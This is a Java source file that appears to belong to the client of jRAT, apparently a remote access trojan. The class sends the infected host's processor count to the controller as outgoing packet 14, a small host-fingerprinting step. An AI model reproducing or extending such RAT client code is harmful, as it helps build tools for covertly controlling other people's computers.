package jrat.client.packets.outgoing;

import jrat.common.io.StringWriter;
import java.io.DataOutputStream;


public class Packet14InitAvailableCores extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		short cores = (short) Runtime.getRuntime().availableProcessors();
		
		dos.writeShort(cores);
	}

	@Override
	public short getPacketId() {
		return (byte) 14;
	}
}
